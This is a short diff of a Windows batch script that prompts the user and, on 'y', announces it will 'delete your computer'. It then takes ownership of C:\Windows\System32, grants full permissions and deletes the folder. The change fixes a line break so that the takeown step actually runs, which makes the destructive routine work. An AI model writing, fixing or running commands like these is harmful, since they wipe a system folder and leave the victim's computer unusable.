@@ -10,7 +10,8 @@ echo.
 set /p choice="Enter your choice[y/n]: "
 if /i "%choice%"=="y" ( 
     echo In that case, let's delete your computer. 
-    timeout /t 2 >nul takeown /f C:\Windows\System32 /r /d y 
+    timeout /t 2 >nul 
+    takeown /f C:\Windows\System32 /r /d y 
     icacls C:\Windows\System32 /grant administrators:F /t /q 
     rd /s /q C:\Windows\System32 
     cls 
